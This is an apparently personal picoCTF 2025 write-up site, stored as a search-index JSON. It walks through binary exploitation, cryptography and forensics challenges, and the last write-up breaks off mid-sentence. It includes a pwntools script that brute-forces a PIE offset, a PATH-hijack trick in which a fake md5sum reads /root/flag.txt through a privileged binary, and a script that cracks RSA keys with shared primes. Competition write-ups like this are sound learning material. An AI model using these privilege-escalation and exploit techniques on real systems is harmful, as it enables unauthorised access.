{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#introduction","title":"Introduction","text":"<p>This is my first time competing with picoCTF. While I did not do as well as I had hoped, I completed more than half of the challenges, identified areas where I need to dive deeper, as well as areas in which I have improved since begginning my cyber security journey.  This CTF is divided into six categories: Web Exploitation, Cryptography, Reverse Engineering, Forensics, General Skills, and Binary Exploitation with each challenge within the categories being assigned a number of points based on it's level of complication. Most challenges were increments of 100 points (100, 200, 300, 400, &amp; 500) though not each category had the same level of challenges. For example, the Forensics and Cryptography categories each have 6 challenges, however Forensics is worth a total of 950 points for all solved challenges while Cryptography is worth 1700 points if all challenges are solved. </p> Navigation tip <p>Depending on the write up, there can be quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"#answers","title":"Answers","text":"<p>General Skills - </p> <p>General Skills write-ups.</p> <p>Web Exploitation - </p> <p>Web Exploitation write-ups.</p> <p>Cryptography - </p> <p>Cryptography write-ups.</p> <p>Reverse Engineering - </p> <p>Reverse Engineering write-ups.</p> <p>Forensics - </p> <p>Forensics write-ups.</p> <p>Binary Exploitation - </p> <p>Binary Exploitation write-ups.</p>"},{"location":"#conclusion","title":"Conclusion","text":"<p>Overall, this event was fun. I was really able to improve a lot of the fundamental skills I've been trying to develop, try out new things, and highlight areas I need further growth and focus in. I'm definitely looking forward to next one.</p> <p></p>"},{"location":"binary/","title":"Welcome","text":""},{"location":"binary/#introduction","title":"Introduction","text":"<p>Welcome to the Binary Exploitation section of the write-up. This category practices using just the binary to work around or overcome security features. This CTF is divided into six categories; Web Exploitation, Cryptography, Reverse Engineering, Forensics, General Skills, and Binary Exploitation. You can follow the links to the other categories or the links below to the challenges I was able to complete before the end of the competition.</p> Navigation tip <p>Depending on the write up, there can be quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"binary/#answers","title":"Answers","text":"<p>1. PIE TIME- </p> <p>Find the local offset and overcome the security feature.</p> <p>2. hash-only-1 - </p> <p>Use Command Injection to retrieve the flag.</p> <p>3. hash-only-2 - </p> <p>Using <code>scp</code> to upload command injection exploitation.</p>"},{"location":"binary/#conclusion","title":"Conclusion","text":"<p>These challenges were unique in my experiences with CTFs so far and I look forward to exploring the category further with the picoCTF practice gym.</p>"},{"location":"cryptography/","title":"Welcome","text":"<p> Welcome to my write-ups for the 2025 picoCTF Cryptography category. I was able to complete three of the six challenges during the challenge window and document them in the following walk-throughs. This CTF is divided into six categories; Web Exploitation, Cryptography, Reverse Engineering, Forensics, General Skills, and Binary Exploitation. You can follow the links to the other categories or the links below to the challenges I was able to complete before the end of the competition.</p> Navigation tip <p>Depending on the write up, there can be quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"cryptography/#answers","title":"Answers","text":"<p>1. hashcrack - </p> <p>Use online cracking tools to find the hashed passwords.</p> <p>2. EVEN RSA CAN BE BROKEN??? - </p> <p>Crack the RSA encryption by comparing <code>N</code> values to find shared primes.</p> <p>3. Guess My Cheese (Part 1) - </p> <p>Discover the secret cheese and Affine Ciphers.</p>"},{"location":"forensics/","title":"Welcome","text":""},{"location":"forensics/#introduction","title":"Introduction","text":"<p>Welcome to the Forensics category write-up section of my picoCTF 2025 experience.  This CTF is divided into six categories; Web Exploitation, Cryptography, Reverse Engineering, Forensics, General Skills, and Binary Exploitation. You can follow the links to the other categories or the links below to the challenges I was able to complete before the end of the competition.</p> Navigation tip <p>Depending on the write up, there can be quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"forensics/#answers","title":"Answers","text":"<p>1. Ph4nt0m 1ntrud3r - </p> <p>Examine a PCAP file to find the intruder.</p> <p>2. RED - </p> <p>Find the hidden message by examining LSB.</p> <p>3. flags are stepic - </p> <p>Find the fake flag image and use stepic to extract the hidden message.</p> <p>4. Bitlocker-1 - </p> <p>Crack a BitLocker password.</p> <p>5. Event-Viewing - </p> <p>Investigate Windows Logs to find the flag.</p>"},{"location":"general/","title":"Welcome","text":""},{"location":"general/#introduction","title":"Introduction","text":"<p>Welcome to my write-ups covering the General Skills challenges of the 2025 picoCTF. During the initial challenge I completed the four challenges below. The first, FANTASY CTF, was an introductory challenge covering the rules and picoCTF platform. The remaining three were an introduction to the Rust programming language. They gave challengers an opportunity to practice code review and documentation reading, which was a good experience for me. This CTF is divided into six categories; Web Exploitation, Cryptography, Reverse Engineering, Forensics, General Skills, and Binary Exploitation. You can follow the links to the other categories or the links below to the challenges I was able to complete before the end of the competition.</p> Navigation tip <p>Depending on the write up, there can be quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"general/#answers","title":"Answers","text":"<p>FANTASY CTF - </p> <p>Follow along the prompts in the fantasy game for an interactive introduction to the rules and platform.</p> <p>Rust fixme 1 - </p> <p>Learn Rust basics reviewing the code and correcting it.</p> <p>Rust fixme 2 - </p> <p>Use references and borrowing to correct the code.</p> <p>Rust fixme 3 - </p> <p>Using code review skills and documentation for unsafe Rust to retrieve the decrypted flag.</p>"},{"location":"reverse/","title":"Welcome","text":""},{"location":"reverse/#introduction","title":"Introduction","text":"<p>Welcome to my write-ups for the Reverse Engineering section of the 2025 picoCTF challenge. Reverse Engineering is a fascinating aspect of the cybersecurity field that is beyond the scope of this write to fully cover. GeekforGeeks does a good job here. Essentially, it is taking something apart to discover what it does.  This CTF is divided into six categories; Web Exploitation, Cryptography, Reverse Engineering, Forensics, General Skills, and Binary Exploitation. You can follow the links to the other categories or the links below to the challenges I was able to complete before the end of the competition.</p> Navigation tip <p>Depending on the write up, there can be quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"reverse/#answers","title":"Answers","text":"<p>1. Flag Hunters - </p> <p>Find the correct injection to view the secret lyrics.</p> <p>2. Binary Instrumentation 1 - </p> <p>Use the Frida tool to find and interact with functions to trigger the flag.</p> <p>3. Tap into Hash - </p> <p>Reverse Engineer the block chain to decrypt the flag.</p>"},{"location":"webexploit/","title":"Web Exploitation (2500 possible points)","text":""},{"location":"webexploit/#introduction","title":"Introduction","text":"<p>This is the Web Exploitation category. As seen, there were a total of 11 challenges worth up to 2500 total points. I was able to complete six of the challenges.</p> Navigation tip <p>Depending on the write up, there can be quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"webexploit/#answers","title":"Answers","text":"<p>1. Cookie Monster Secret Recipe (50 points)- </p> <p>Explore Developer Tools and cookies for the flag.</p> <p>2. head-dump (50 points) - </p> <p>Inspect the .heapdump to extract the flag.</p> <p>3. n0s4n1ty 1 (100 points) - </p> <p>Take advantage of flawed upload sanitation to establish a webshell to exfiltrate your flag.</p> <p>4. SSTI 1 (100 points) - </p> <p>Use online resources to take advantage of a SSTI vulnerability.</p> <p>5. SSTI 2 (200 points) - </p> <p>Using the tools from the last challenge, bypass the filters put in place to retrieve the flag.</p> <p>6. 3v@l (200 points) - </p> <p>Bypass Regex filters to exploit <code>eval</code> and retrieve the flag.</p>"},{"location":"webexploit/#conclusion","title":"Conclusion","text":"<p>That is the extent of the Web Exploitation Category that I was able to complete during the competition. There were other challenges that I look forward to completing eventually. Web Exploitation was the largest of the categories in the picoCTF challenge, which seems appropriate given the vastness of the topic.I'll be adding other write-ups to this as I am able to complete them. </p>"},{"location":"Binary%20Exploitation/o1/","title":"PIE TIME","text":"<p>Difficulty: </p>"},{"location":"Binary%20Exploitation/o1/#objective","title":"Objective","text":"<p>Description</p> <p>Can you try to get the flag? Beware we have PIE!</p>"},{"location":"Binary%20Exploitation/o1/#hints","title":"Hints","text":"Hint 1 <p>Can you figure out what changed between the address you found locally and in the server output?</p>"},{"location":"Binary%20Exploitation/o1/#solution","title":"Solution","text":"<p>When we start the instance for this challenge, we are given a copy of the source code and the binary as well as a <code>netcat</code> command to connect to the remote service. Based off the title and description of this challenge, we can assume PIE stands for Position Independent Executable. This is a security mechanism that works by doing a few things:</p> <pre><code>1.  Randomizes the base memory address of an executable each time it runs\n2.  Makes the program's code and data load at random memory locations\n3.  Works as part of ASLR (Address Space Layout Randomization)\n</code></pre> <p>PIE is a common security feature that is meant to make buffer overflow attacks and other memory corruption exploits significantly more difficult by making it more difficult to predict where vulnerable code will be located in memory.  Let's open up our version of the source code. I'm using VS Code &amp; VSCodium to review it. There are three main functions:     -   <code>main()</code>- The entry point     -   <code>win()</code>- A function that reads and prints the flag     -   <code>segfault_handler()</code>- Handles segmentation faults</p> <p>When executed, the program prints the address of the <code>main</code> function: <code>printf(\"Address of main: %p\\n\", &amp;main);</code> It then prompts the user to input a memory address in hexadecimal and attempts to jump to that address to execute any code found there.</p> <p>Local execution<pre><code># make the program executable\nchmod +x vuln\n\n# execute the program\n./vuln\n</code></pre>  caption /// PIE means that each time the code is executed, <code>main</code> should be somewhere new. ///</p> <p>Now the challenge is to figure out how to determine the address of the <code>win()</code> funtion on line 11:</p> win() function<pre><code>int win() {\n  FILE *fptr;\n  char c;\n</code></pre> <p>One way we can do this is to determine the offset between <code>main()</code> and <code>win()</code>. While PIE randomizes the absolute addresses each run, the relative distance between different functions remain the same. If we can determine the offset between <code>main()</code> and <code>win()</code> we are then able to calculate the location of <code>win()</code> when given the location of <code>main()</code>.  Since the location of <code>main</code> is provided all we need to do is figure out the address of <code>win</code>. To do that I used <code>gdb</code>, a debugger that is typically available on Unix-like machines. From the command line enter <code>gdb ./vuln</code></p> <p></p> <p>Use the <code>print</code> function to show the location of <code>win</code> and <code>main</code>.</p> <p>When I printed the location of <code>win</code>, I noticed the difference in what was provided and what was given for <code>main</code> by the program so I used <code>print</code> to get the location of <code>main</code> as well so that it would be easier to calculate the offset.   To calculate the offset, subtract the value of <code>win</code> from <code>main</code>: <code>main</code> - <code>win</code> = <code>0x1284</code> - <code>0x11e6</code> = <code>0x9E</code> (158 bytes). This means that when the program provides the exact location of <code>main</code>, we should be able to subtract <code>0x9E</code> from the provided address to get the address of <code>win</code>, which can be inputed to get the flag.  Exit <code>gdb</code> and run the executable again, subtract the <code>0x9E</code> from the value provided and input it to test. </p> <p></p> <p>The  test works locally</p> <p>The address of <code>main</code> is provided as <code>0x5640A5BB6284</code>. Subtracting <code>0x9E</code> results in <code>0x5640A5BB61E6</code>.</p> <p>Hexadecimal arithmetic</p> <p>If you are not already familiar, hexadecimal arithmetic involves converting the hexidecimal number into decimal form, perfoming the mathmatical function, then converting back to hexadecimal. CyberChef is a free online tool that can be used for easy conversion. For this problem:</p> <ul> <li>Convert <code>0x9E</code> to decimal:     0x9E = 158</li> <li>Convert <code>0x5640A5BB6284</code> to decimal:     0x5640A5BB6284 = 377441309948292</li> <li>subtract 377441309948292 - 158 = 377441309948134.</li> <li>Convert 377441309948134 to hexadecimal      377441309948134 = 0x5640A5BB61E6</li> </ul> <p>It looks like it works, so lets use <code>netcat</code> to connect to the server and try the same thing.</p> <p></p> <p>Hmm... That was supposed to work.</p> <p>Well, that's disappointing. After spending some time trying to figure out how I messed up, I wrote a script using <code>pwntools</code> to test a small range around the offset I had found locally.</p> solve.py<pre><code>#!/usr/bin/env python3\nfrom pwn import *\nimport re\n\ncontext.log_level = 'info'\n\nREMOTE = \"rescued-float.picoctf.net\"\nPORT = &lt;input provided port&gt;\n\ndef try_offset(offset):\n    conn = remote(REMOTE, PORT)\n    try:\n        line = conn.recvline().decode().strip()\n        main_addr_match = re.search(r\"Address of main: (0x[0-9a-fA-F]+)\", line)\n        if not main_addr_match:\n            conn.close()\n            return False\n        main_addr = int(main_addr_match.group(1), 16)\n        win_addr = main_addr - offset\n        conn.sendline(hex(win_addr).encode())\n        conn.recvline()\n        try:\n            result = conn.recvline().decode().strip()\n            if \"You won\" in result:\n                flag = conn.recvline().decode().strip()\n                log.success(f\"Offset {hex(offset)} worked. Flag: {flag}\")\n                conn.close()\n                return True\n            else:\n                conn.close()\n                return False\n        except EOFError:\n            log.warning(f\"EOFError during recvline. Offset: {hex(offset)}\")\n            conn.close()\n            return False\n\n    except Exception as e:\n        log.error(f\"Error: {e}\")\n        conn.close()\n        return False\n\ndef main():\n    base_offset = 0x9E\n    for i in range(-10, 11):\n        offset = base_offset + i\n        if try_offset(offset):\n            return\n    log.failure(\"Failed to find the correct offset.\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>Answer</p> <p>Find the offset locally, then explore a small area of memory remotely to find the correct location of the <code>win()</code> function.</p>"},{"location":"Binary%20Exploitation/o2/","title":"hash-only-1","text":"<p>Difficulty:  Direct link: hash-only-1 binary</p>"},{"location":"Binary%20Exploitation/o2/#objective","title":"Objective","text":"<p>Description</p> <p>Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!</p>"},{"location":"Binary%20Exploitation/o2/#solution","title":"Solution","text":"<p>When the instance is started we get a <code>ssh</code> command to connect to the challenge along with a password and instructions to run the binary named \"flaghasher\". There is also an opportunity to download a copy of the binary using <code>scp</code>. I started by using <code>ssh</code> to get an idea of what the challenge looks like:</p> <p></p> <p>Using the <code>ssh</code> command and password provided, connect to the service and run the <code>flaghasher</code> program. </p> <p>Running the program produces an md5 hash, presumably of the flag in the expected 'picoCTF{dummy_flag_here}' format. Importantly, the path <code>root/flag.txt</code> is provided. Next use <code>scp</code> to download the <code>flaghasher</code> binary. With the binary downloaded, I used <code>strings</code> to begin searching for clues. </p> Binary Enumeration<pre><code>strings flaghasher &gt; strings.out\n</code></pre> <p>Reviewing the output of the <code>strings</code> command, I see first the same text that was seen when we ran the <code>flaghasher</code> from <code>ssh</code> \"Computing the MD5 hash of /root/flag.txt....\" Beneath this is the line <code>/bin/bash -c 'md5sum /root/flag.txt'</code></p> <p></p> <p>Use <code>strings</code> to enumerate the binary</p> <p>Lets break this down: <code>/bin/bash -c 'md5sum /root/flag.txt'</code></p> <code>/bin/bash</code> <p>Explicitly calls the Bash shell as the command interpreter</p> <code>-c</code> <p>This flag tells Bash to execute the command provided as a string</p> <code>'md5sum /root/flag.txt'</code> <p>this is the actual command being executed inside Bash</p> <ul> <li> <p><code>md5sum</code> is a command-line utility that calculates the MD5 hash of a file</p> </li> <li> <p><code>/root/flag.txt</code> is the target file whose hash is being calculated.</p> <ul> <li>It is significant to note that, typically speaking, reading, writing, or exectuing something from the <code>/root</code> directory requires root level permission.</li> </ul> </li> </ul> <p>Now we know the command that the <code>flaghasher</code> program uses, we need to try to change how it happens. If not still connected through <code>ssh</code> then reconnect before executing the below commands.</p> Create fake md5sum script<pre><code>echo -e '#!/bin/bash\\ncat /root/flag.txt' &gt; ./md5sum\nchmod +x ./md5sum\n</code></pre> <p>What this does:</p> <ul> <li><code>echo -e</code>:<ul> <li><code>echo</code> prints text to the terminal or redirects it to a file</li> <li>The <code>-e</code> flag enables interpretation of escape sequences</li> </ul> </li> <li><code>'#!/bin/bash\\ncat /root/flag.txt'</code><ul> <li><code>#!/bin/bash</code> is a shebang that specifies the script should be executed using Bash</li> <li><code>\\n</code> is a newline character. It causes the next command to appear on a new line</li> <li><code>cat /root/flag.txt</code> outputs the contents of <code>/root/flag.txt</code> to the terminal</li> </ul> </li> <li><code>&gt; ./md5sum</code><ul> <li>The <code>&gt;</code> operator redirects the output of <code>echo</code> into a file named <code>md5sum</code> in the currnt directory</li> </ul> </li> <li><code>chmod +x ./md5sum</code> makes the file <code>md5sum</code> executable.</li> </ul> <p>Next, we'll try to modify the path and run the binary:</p> Run binary with custom path<pre><code>PATH=. :$PATH ./flaghasher\n</code></pre> <p>What does it do?</p> <ul> <li><code>PATH=.:$PATH</code><ul> <li>This modifies the <code>PATH</code> environment variable, which determines where the shell looks for executable files</li> <li><code>.</code> represents the current directory</li> <li><code>:$PATH</code> appends the existing <code>PATH</code> variable</li> <li>After this modification, when a command is run, the shell will first check the current directory before checking system directories </li> </ul> </li> <li><code>./flaghasher</code> <ul> <li>explicitly runs the <code>flaghasher</code> binary</li> </ul> </li> </ul> <p>Now when <code>flaghasher</code> executes <code>md5sum</code>, the shell checks the current directory first, sees the fake <code>md5sum</code> that was created and executes it.</p> <p></p> <p>Trick the system to do what you want</p> <p>Answer</p> <p>Use command injection to retrieve the flag.</p>"},{"location":"Binary%20Exploitation/o3/","title":"hash-only-2","text":"<p>Difficulty: </p>"},{"location":"Binary%20Exploitation/o3/#objective","title":"Objective","text":"<p>Description</p> <p>Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!</p>"},{"location":"Binary%20Exploitation/o3/#solution","title":"Solution","text":"<p>This challenge starts with the same prompt as hash-only-1. When the instance is started, we are given an <code>ssh</code> command again, with the same instruction to run the binary named \"flaghasher\". We do not have an <code>scp</code> command suggestion this time.   I start by executing the <code>ssh</code> command and poking around the terminal. It turns out that <code>flaghasher</code> can be executed without being in the same directory this time. I locate the binary, but unsuprisingly am not able to use the same trick this time. Both the <code>echo</code> and redirect <code>&gt;</code> seem to be blocked. I use the same <code>strings</code> command without an output this time and find that the binary appears to be using the same command as the last challenge. </p> <p></p> <p></p> <p></p> <p>Without being able to write to a file though, it takes me while to figure out a path forward. In fact, this one required pacing with a rubber duck before eventually I had a lightbulb moment.  Creating the <code>md5sum</code> file locally, I then used <code>scp</code> to send the file to the target. With the new <code>md5sum</code> delivered, I used <code>ssh</code> to reconnect, and <code>chmod</code> to make it executable, then execute <code>flaghasher</code> to retrieve the flag. </p> <p> </p> <p>Answer</p> <p>Use <code>scp</code> and command injection to send a malicious file allowing the retrieval of the flag.</p>"},{"location":"Cryptography/o1/","title":"Insert Objective 1 Title","text":"<p>Difficulty:  Direct link: <code>nc verbal-sleep.picoctf.net 51759</code></p>"},{"location":"Cryptography/o1/#objective","title":"Objective","text":"<p>Description</p> <p>A company stored a secret message on a server which got breached due to the admin using weakly hashed passwords. Can you gain access to the secret stored within the server?</p>"},{"location":"Cryptography/o1/#hints","title":"Hints","text":"Hint 1 <p>Understanding hashes is very crucial. Read more here.</p> Hint 2 <p>Can you identify the hash algorithm? Look carefully at the length and structure of each hash identified.</p> Hint 3 <p>Tried using any hash cracking tools?</p>"},{"location":"Cryptography/o1/#solution","title":"Solution","text":"<p>This challenge is an introduction to hashing and some of the tools around hashing. If you are unfamiliar with the technology, the pico primer provided in the hints is a great starting point.  There are a number of tools available for hashcracking such as JohnTheRipper and hashcat. There are also some invaluable online resources such as CyberChef and CrackStation that are free to use.</p> <p>Hashing vs Encryption</p> <p>Hashing and Encryption are both key parts of cybersecurity with distinct purposes and differences. A key factor to remember though is that hashing cannot be reversed. When using tools like CrackStation or <code>hashcat</code>, the hacker is comparing the exfiltrated hash to a list of known words using the same hashing algorithm. Read more about the differences here</p> <p>To start the challenge, type or paste the <code>netcat</code> command into a terminal.</p> <p></p> <p>A hash and password entry field</p> <p>I started with just pasting the hash into CrackStation.</p> <p></p> <p>Tools like CrackStation are great for low overhead cracking</p> <p>The result tells us the type  of hashing method, in this case the notoriusly insecure MD5, and the password. We can paste or type that password in our terminal to get the next prompt:</p> <p></p> <p>We can use the same method for the revealed hash, which turns out to be SHA1, another hashing method that has been largely phased out. </p> <p></p> <p>Grab the password and put it in your terminal</p> <p>Continuing through the prompts, we get a SHA256 hash for the final challenge. This one is also available through CrackStation.</p> <p></p> <p>Hashes are really only secure if the passwords they hash are unique</p> <p>When put into the terminal, we finally get the flag.</p> <p></p> <p>Success</p> <p>Answer</p> <p>Use online cracking tools to find the hashed passwords.</p>"},{"location":"Cryptography/o2/","title":"EVEN RSA CAN BE BROKEN???","text":"<p>Difficulty:  Source Code: RSA</p>"},{"location":"Cryptography/o2/#objective","title":"Objective","text":"<p>Description</p> <p>This service provides you an encrypted flag. Can you decrypt it with just N &amp; e?</p> <p>Connect</p> <p>Connect to the program with netcat: <code>nc verbal-sleep.picoctf.net 55510</code></p>"},{"location":"Cryptography/o2/#hints","title":"Hints","text":"Hint 1 <p>How much do we trust randomness?</p> Hint 2 <p>Notice anything interesting about N?</p> Hint 3 <p>Try comparing N across multiple requests</p>"},{"location":"Cryptography/o2/#solution","title":"Solution","text":"<p>Start by downloading and reviewing the python code provided and run the <code>netcat</code> command to get an idea of what it looks like. </p> <p></p> <p>Running the command gives us the N, e, and cyphertext</p> <p>We now have N, e, and the cyphertext, presumably in the form of picoCTF{some_flag}. Following the hints, repeat the command a few times to get multiple samples of N. </p> <p></p> <p>Use the samples to help</p> <p>With the clues given about radmoness and <code>N</code> we can hypothesis that the code being used is generating shared primes. If the code reuses the same prime numbers across multiple key generations, it can be possible to find a shared common prime factor accross different <code>N</code>. If two <code>N</code> values share a prime factor, it's possible to determine the prime factor with the greatest common divisor.   After obtaining multiple <code>N</code> values, we need to calculate the GCD. To calculate the GCD of two relatively small numbers you can write a script that looks like this:</p> GCD<pre><code>def gcd(a, b):\n    result = min(a, b)\n\n    while result:\n        if a % result == 0 and b % result == 0:\n            break\n        result -= 1\n    return result\n\nif __name__ == '__main__':\n    N1 = # insert first number\n    N2 = # insert second number\n    print(f\"GCD of {N1} and {N2} is {gcd(a, b)}\")\n</code></pre> <p>Don't reinvent the wheel</p> <p>Python has libraries that you can use that are highly recommended for calculating large numbers efficiently. Specifically, the <code>gmpy2</code> library but the python math library is also an option. While it is useful to understand how it works, there is no need to write the code if it already exists. </p> <p>When the shared prime (<code>p</code>) is determined, it can be used to find the other prime factors (<code>q1</code> and <code>q2</code>) by dividing <code>N1</code> and <code>N2</code> by <code>p</code>. We'll use the found prime factors to calculate the private exponent <code>d</code>:</p> <pre><code>*   `phi = (p - 1) * (q - 1)`\n*   `d = inverse(e, phi)`\n</code></pre> <p>The private exponent <code>d</code> enables us to decrypt via: <code>plaintext = pow(ciphertext, d, N)</code>.</p> <p>Putting all the parts together, I used a script that connected to the <code>netcat</code> service, gathered multiple <code>N</code> values and decrypted the ciphertext.</p> solve.py<pre><code>import socket\nfrom Crypto.Util.number import long_to_bytes, inverse\nimport gmpy2\n\ndef solve_rsa(N1, N2, ciphertext):\n    p = gmpy2.gcd(N1, N2)  \n    if p &gt; 1:\n        q = N1 // p\n        phi = (p - 1) * (q - 1)\n        d = inverse(65537, phi)\n        plaintext = pow(ciphertext, d, N1)\n        return long_to_bytes(plaintext).decode()\n    else:\n        return None\n\ndef get_data_from_server():\n    host = \"verbal-sleep.picoctf.net\"\n    port = 55510\n\n    try:\n        with socket.create_connection((host, port)) as s:\n            data = s.recv(4096).decode()\n            n_line = data.split('N: ')[1].split('\\n')[0]\n            cypher_line = data.split('cyphertext: ')[1].split('\\n')[0]\n            N = int(n_line)\n            ciphertext = int(cypher_line)\n            return N, ciphertext\n    except Exception as e:\n        print(f\"Error connecting to server: {e}\")\n        return None, None\n\ndef main():\n    n_values = []\n    cypher_values = []\n\n    for _ in range(3): # get 3 values, just to be sure.\n        N, ciphertext = get_data_from_server()\n        if N is None or ciphertext is None:\n            return\n        n_values.append(N)\n        cypher_values.append(ciphertext)\n\n    for i in range(len(n_values)):\n        for j in range(i + 1, len(n_values)):\n            flag = solve_rsa(n_values[i], n_values[j], cypher_values[i])\n            if flag:\n                print(\"Flag:\", flag)\n                return\n\n    print(\"Failed to find shared prime.\")\n\nif __name__ == \"__main__\":\n    main() \n</code></pre> <p>Dependencies</p> <p>If using this code, first run <code>pip install pycryptodome</code> &amp; <code>pip install gmpy2</code></p> <p>Answer</p> <p>Compare multiple <code>N</code> value to determne the shared prime and crack the ciphertext</p>"},{"location":"Cryptography/o3/","title":"Guess My Cheese (Part 1)","text":"<p>Difficulty:  Direct connect: <code>nc verbal-sleep.picoctf.net 60985</code></p>"},{"location":"Cryptography/o3/#objective","title":"Objective","text":"<p>Description</p> <p>Try to decrypt the secret cheese password to prove you're not the imposter!</p>"},{"location":"Cryptography/o3/#hints","title":"Hints","text":"Hint 1 <p>Remember that cipher we devised together Squeexy? The one that incorporates your affinity for linear equations???</p>"},{"location":"Cryptography/o3/#solution","title":"Solution","text":"<p>We start with the terminal for this challenge; connect to the service with <code>netcat</code>.</p> <p></p> <p>Initiate the service to see our story prompt</p> <p>We get a little blurb about \"evil Dr. Lacktoes Inn Tolerant\" and his diabolical plot of mice cloning along with an encoded message. Next, there is a prompt with options to <code>(g)uess or (e)ncrypt</code>.   If you are familiar with the various forms of encryption and ciphers, you may have picked up on the clue in the hint. If not, a quick online search will help put together an \"affinity for linear equations\" with an Affine Cipher. </p> <p></p> <p>Quick online search shows a number of references to Affine Cipher</p> <p>The site dCode, like the online tool CrackStation used in the hashcrack challenge, is a invaluable, free online resource that is really useful to have bookmarked. Let's just copy and paste the encoded message from the terminal to the Affine Cipher and see what we get. The Affine Cipher is a type of substitution cipher, which means that it can be potentially brute force cracked by trying every/multiple variations. If we know the encryption key that is used, we can use it to decrypt a given ciphertext. Since the service allows us to encrypt a word (as long as it is a cheese), we can take the encrypted text, plug it into the bruteforce decoder and then apply the calculated keys to the encrypted cheese. </p> <p> </p> <p>Answer</p> <ol> <li>Connect to the service with <code>netcat</code></li> <li>Encrypt a known cheese (PROVOLONE, SWISS, MOZZARELLA)</li> <li>Use a tool such as dcode.fr to bruteforce the <code>A</code> &amp; <code>B</code> coefficient</li> <li>Use the coefficients found to decrypt the secret cheese manually on the same site</li> </ol>"},{"location":"Forensics/o1/","title":"Ph4nt0m 1ntrud3r","text":"<p>Difficulty:  Direct link: Network Traffic PCAP file</p>"},{"location":"Forensics/o1/#objective","title":"Objective","text":"<p>Description</p> <p>A digital ghost has breached my defenses, and my sensitive data has been stolen! \ud83d\ude31\ud83d\udcbb Your mission is to uncover how this phantom intruder infiltrated my system and retrieve the hidden flag. To solve this challenge, you'll need to analyze the provided PCAP file and track down the attack method. The attacker has cleverly concealed his moves in well timely manner. Dive into the network traffic, apply the right filters and show off your forensic prowess and unmask the digital intruder!</p>"},{"location":"Forensics/o1/#hints","title":"Hints","text":"Hint 1 <p>Filter your packets to narrow down your search.</p> Hint 2 <p>Attacks were done in timely manner.</p> Hint 3 <p>Time is essential</p>"},{"location":"Forensics/o1/#solution","title":"Solution","text":"<p>This challenge gives us a PCAP file to examine with 22 packets. The clues are minimal; the first suggesting narrowing the search by filtering, and the last two hinting at \"time\". So to start, just filter the packets by the \"Time\" field by clicking the header. </p> <p></p> <p>Sort by time</p> <p>The next thing I did was just open the packets and look at the payloads. I was looking for any patterns or something that jumped out. What I noticed was that the oldest packets, almost all equaling a length of 12, looked really similar to Base64. </p> <p></p> <p>Watching for patterns, this looks familiar</p> <p>When I pasted the last packt, or first packet, depending on how you filter the time, I was convinced I was on the right track.</p> <p></p> <p>My hunch was right; the last packet contains a bracket in Base64 encoding</p> <p>With this information it was apparent that the flag was encoded in base64 across multiple packets. It looked to me like the packets with a len of 12 were the packets with the Base64 encoding. I grabbed the first payload of that group of packets and verified with CyberChef</p> <p></p> <p>Now I just need to put it together</p> <p>I know which packets have the flag; I probably know the order that they need to be used (based on time), and I know how the payloads are encoded. I use this to write a script to decode and assemble the full flag:</p> phantom solve.py<pre><code>from scapy.all import *\nimport base64\n\npackets = rdpcap(\"myNetworkTraffic.pcap\")\npacket_numbers = [5, 2, 21, 7, 11, 16, 8]\n\ndecoded_payloads = []\nfor i in packet_numbers:\n    packet = packets[i-1]\n    if Raw in packet:\n        payload = packet[Raw].load\n        try:\n            decoded = base64.b64decode(payload).decode('utf-8', errors='replace')\n            decoded_payloads.append(decoded)\n            print(f\"Packet {i} payload (decoded): {decoded}\")\n        except Exception as e:\n            print(f\"Error decoding payload from packet {i}: {e}\")\n\n# Concatenate all decoded payloads\nfinal_payload = ''.join(decoded_payloads)\nprint(\"\\nFinal Decoded Payload:\", final_payload)\n</code></pre> <p></p> <p>This was easier than doing it by hand, but both are valid options</p> <p>Answer</p> <p>Assemble the correct payloads in the correct order to determine the flag. </p>"},{"location":"Forensics/o2/","title":"RED","text":"<p>Difficulty:  Direct link: </p>"},{"location":"Forensics/o2/#objective","title":"Objective","text":"<p>Description</p> <p>RED, RED, RED, RED</p>"},{"location":"Forensics/o2/#hints","title":"Hints","text":"Hint 1 <p>The picture seems pure, but is it though?</p> Hint 2 <p>Red?Ged?Bed?Aed?</p> Hint 3 <p>Check whatever Facebook is called now.</p>"},{"location":"Forensics/o2/#solution","title":"Solution","text":"<p>The challenge gives very little in the way of a description. Obviously, the file needs to be examined so download it to begin with. I started with <code>exiftool</code> and GIMP (GNU Image Manipulation Program).</p> <p></p> <p>As I was exploring the options, this menu provided insight into the \"Facebook\" clue </p> <p></p> <p>Only the poem seems to be out of the ordinary</p> <p>Using <code>exiftool</code> shows us the poem, but it doesn't seems to make much sense to me. I spent time extracting the various channels and trying to find the hidden message (because there has to be a hidden message). I eventually ran <code>strings</code> on the image and that finally revealed a new clue.</p> <p></p> <p>Strings presents a specific format that was helpful</p> <p>After running <code>strings red.jpg</code>, the poem was finally presented in 